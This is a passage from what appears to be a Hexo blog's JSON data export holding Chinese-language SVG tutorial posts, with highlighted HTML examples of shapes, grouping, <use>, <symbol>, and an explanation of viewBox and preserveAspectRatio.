class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">rx</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">ry</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #009;stroke: #f00; stroke-width: 2; fill-opacity: 0.5; stroke-opacity: 5.2&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;290&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #0f0; fill-opacity: .4;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ellipse</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;150&quot;</span> <span class=\"attr\">rx</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">ry</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #900; stroke: #999; stroke-width: 3; stroke-opacity: .5;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">line</span> <span class=\"attr\">x1</span>=<span class=\"string\">&quot;240&quot;</span> <span class=\"attr\">y1</span>=<span class=\"string\">&quot;220&quot;</span> <span class=\"attr\">x2</span>=<span class=\"string\">&quot;395&quot;</span> <span class=\"attr\">y2</span>=<span class=\"string\">&quot;220&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;stroke: #333; stroke-width: 2;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">polyline</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;3,3 10,40 50,100 20,150 20,180 50,180 50,210 80,210 110,210&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill:none; stroke:#099; stroke-width: 1&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;110, 20 30, 40 80, 50&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #934;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;100,10 40,198 190,78 10,78 160,198&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M 175 200 l 150 0&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;green&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;3&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M 100 350 q 150 -300 300 0&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;blue&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;5&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"结构元素\"><a href=\"#结构元素\" class=\"headerlink\" title=\"结构元素\"></a>结构元素</h2><h3 id=\"分组-（-lt-g-gt-）\"><a href=\"#分组-（-lt-g-gt-）\" class=\"headerlink\" title=\"分组 （&lt;g&gt;）\"></a>分组 （<code>&lt;g&gt;</code>）</h3><p>说明：<code>&lt;g&gt;</code> 用于分组，它能把多个元素放在一组里，对 <code>&lt;g&gt;</code> 标记的样式和渲染会作用到这个分组内的所有元素上。组内的所有元素都会继承 <code>&lt;g&gt;</code> 标记上的所有属性。用 <code>&lt;g&gt;</code> 定义的分组还可以使用 <code>&lt;use&gt;</code> 进行复制使用。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: red; stroke: #090; stroke-width: 2;&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;180&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;140&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">circle</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;230&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"复制-（-lt-use-gt-）\"><a href=\"#复制-（-lt-use-gt-）\" class=\"headerlink\" title=\"复制 （&lt;use&gt;）\"></a>复制 （<code>&lt;use&gt;</code>）</h3><p>说明：<code>&lt;use&gt;</code> 能从 SVG 文档内部取出一个节点，克隆它，并把它输出到别处。子元素能继承来自 <code>&lt;use&gt;</code> 样式</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;shape&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: inherit; stroke: #090; stroke-width: 2;&quot;</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;180&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;140&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">circle</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;230&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span>&gt;</span>图形1<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#shape&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #009;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">use</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"模板（）\"><a href=\"#模板（）\" class=\"headerlink\" title=\"模板（）\"></a>模板（<symbol>）</h3><p><code>&lt;symbol&gt;</code> 的作用是定义一个图像模板，使用 <code>&lt;use&gt;</code> 标记实例化它，然后在 SVG 文档中反复使用。<code>&lt;symbol&gt;</code> 本身不会输出任何图像，只有使用 <code>&lt;use&gt;</code> 实例化后才会显示。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- symbol definition  NEVER draw --&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">symbol</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sym01&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 150 110&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;red&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;red&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;90&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;green&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;white&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">symbol</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- actual drawing by &quot;use&quot; element --&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#sym01&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#sym01&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;75&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;38&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#sym01&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;25&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"viewBox 与 preserveAspectRatio","date":"2021-03-23T16:00:00.000Z","_content":"\n# viewBox 与 preserveAspectRatio\n\n### 视窗（viewport） \n视窗是指一块 SVG 可见的区域\n\n如 `<svg width=\"500\" height=\"300\"></svg>` 定义了一个视区，宽 500 单位，高 300 单位（并没有指定是像素，也可以指定为 `em`、`rem` 等）\n\n当 `width` 、 `height` 如果是纯数字，使用的就是 “像素” 作为单位的，SVG 中的其他子元素也是相同的原理\n\n### 视图盒子（viewBox）\nviewBox 属性相当于给 svg 图像设置了一个选区，然后将这个选区填充到整个 svg 画布中，最后的看到的结果就是选区中的图像缩放后的结果。\n\n这个属性有四个值，分别为坐标系统中的x值，y值，宽度，高度，属性值之间用空格或者是逗号合开。\n\n实际上这 4 个值唯一的确定了一个矩形和矩形的位置，x值和y值是矩形左上角顶点的坐标，宽和高分别是矩形的宽和高，单位为像素，这个矩形就是上述的选区。\n\n```html\n<svg width=\"400\" height=\"300\" viewBox=\"0,0,40,30\" style=\"border:1px solid #cd0000;\">\n    <rect x=\"10\" y=\"5\" width=\"20\" height=\"15\" fill=\"#cd0000\"/>\n</svg>\n```\n\n### preserveAspectRatio\n`preserveAspectRatio=\"xMidYMid meet\"`\n\n* xMidYMid：表示 viewBox 如何与 viewport 对齐\n* meet：表示如何维持高宽比\n\n| 值 | 含义 |\n| --- | --- |\n|xMin |\tviewport 和 viewBox 左边对齐 |\n|xMid |\tviewport 和 viewBox  x 轴中心对齐 |\n|xMax |\tviewport 和 viewBox 右边对齐 |\n|YMin |\tviewport 和 viewBox 上边缘对齐 |\n|YMid |\tviewport 和 viewBox  y 轴中心点对齐 |\n|YMax |\tviewport 和 viewBox 下边缘对齐 |\n\n| 值 | 含义 |\n| --- | --- |\n|meet | 保持纵横比缩放 viewBox 适应 viewport |\n|slice | 保持纵横比同时比例小的方向放大填满 viewport |\n|none |\t 扭曲纵横比以充分适应 viewport |\n\n\t\n\t\n\t\n","source":"_posts/SVG/viewBox 与 preserveAspectRatio.md","raw":"---\ntitle: viewBox 与 preserveAspectRatio\ncategories: SVG\ntags: [SVG]\ndate: 2021-03-24\n---\n\n# viewBox 与 preserveAspectRatio\n\n### 视窗（viewport） \n视窗是指一块 SVG 可见的区域\n\n如 `<svg width=\"500\" height=\"300\"></svg>` 定义了一个视区，宽 500 单位，高 300 单位（并没有指定是像素，也可以指定为 `em`、`rem` 等）\n\n当 `width` 、 `height` 如果是纯数字，使用的就是 “像素” 作为单位的，SVG 中的其他子元素也是相同的原理\n\n### 视图盒子（viewBox）\nviewBox 属性相当于给 svg 图像设置了一个选区，然后将这个选区填充到整个 svg 画布中，最后的看到的结果就是选区中的图像缩放后的结果。\n\n这个属性有四个值，分别为坐标系统中的x值，y值，宽度，高度，属性值之间用空格或者是逗号合开。\n\n实际上这 4 个值唯一的确定了一个矩形和矩形的位置，x值和y值是矩形左上角顶点的坐标，宽和高分别是矩形的宽和高，单位为像素，这个矩形就是上述的选区。\n\n```html\n<svg width=\"400\" height=\"300\" viewBox=\"0,0,40,30\" style=\"border:1px solid #cd0000;\">\n    <rect x=\"10\" y=\"5\" width=\"20\" height=\"15\" fill=\"#cd0000\"/>\n</svg>\n```\n\n### preserveAspectRatio\n`preserveAspectRatio=\"xMidYMid meet\"`\n\n* xMidYMid：表示 viewBox 如何与 viewport 对齐\n* meet：表示如何维持高宽比\n\n| 值 | 含义 |\n| --- | --- |\n|xMin |\tviewport 和 viewBox 左边对齐 |\n|xMid |\tviewport 和 viewBox  x 轴中心对齐 |\n|xMax |\tviewport 和 viewBox 右边对齐 |\n|YMin |\tviewport 和 viewBox 上边缘对齐 |\n|YMid |\tviewport 和 viewBox  y 轴中心点对齐 |\n|YMax |\tviewport 和 viewBox 下边缘对齐 |\n\n| 值 | 含义 |\n| --- | --- |\n|meet | 保持纵横比缩放 viewBox 适应 viewport |\n|slice | 保持纵横比同时比例小的方向放大填满 viewport |\n|none |\t 扭曲纵横比以充分适应 viewport |\n\n\t\n\t\n\t\n","slug":"SVG/viewBox 与 preserveAspectRatio","published":1,"updated":"2021-04-28T02:34:28.817Z","_id":"cko0u1271000by26rfpmyg2k5","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"viewBox-与-preserveAspectRatio\"><a href=\"#viewBox-与-preserveAspectRatio\" class=\"headerlink\" title=\"viewBox 与 preserveAspectRatio\"></a>viewBox 与 preserveAspectRatio</h1><h3 id=\"视窗（viewport）\"><a href=\"#视窗（viewport）\" class=\"headerlink\" title=\"视窗（viewport）\"></a>视窗（viewport）</h3><p>视窗是指一块 SVG 可见的区域</p>\n<p>如 <code>&lt;svg width=&quot;500&quot; height=&quot;300&quot;&gt;&lt;/svg&gt;</code> 定义了一个视区，宽 500 单位，高 300 单位（并没有指定是像素，也可以指定为 <code>em</code>、<code>rem</code> 等）</p>\n<p>当 <code>width</code> 、 <code>height</code> 如果是纯数字，使用的就是 “像素” 作为单位的，SVG 中的其他子元素也是相同的原理</p>\n<h3 id=\"视图盒子（viewBox）\"><a href=\"#视图盒子（viewBox）\" class=\"headerlink\" title=\"视图盒子（viewBox）\"></a>视图盒子（viewBox）</h3><p>viewBox 属性相当于给 svg 图像设置了一个选区，然后将这个选区填充到整个 svg 画布中，最后的看到的结果就是选区中的图像缩放后的结果。</p>\n<p>这个属性有四个值，分别为坐标系统中的x值，y值，宽度，高度，属性值之间用空格或者是逗号合开。</p>\n<p>实际上这 4 个值唯一的确定了一个矩形和矩形的位置，x值和y值是矩形左上角顶点的坐标，宽和高分别是矩形的宽和高，单位为像素，这个矩形就是上述的选区。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0,0,40,30&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border:1px solid #cd0000;&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;10&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;5&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;#cd0000&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"preserveAspectRatio\"><a href=\"#preserveAspectRatio\" class=\"headerlink\" title=\"preserveAspectRatio\"></a>preserveAspectRatio</h3><p><code>preserveAspectRatio=&quot;xMidYMid meet&quot;</code></p>\n<ul>\n<li>xMidYMid：表示 viewBox 如何与 viewport 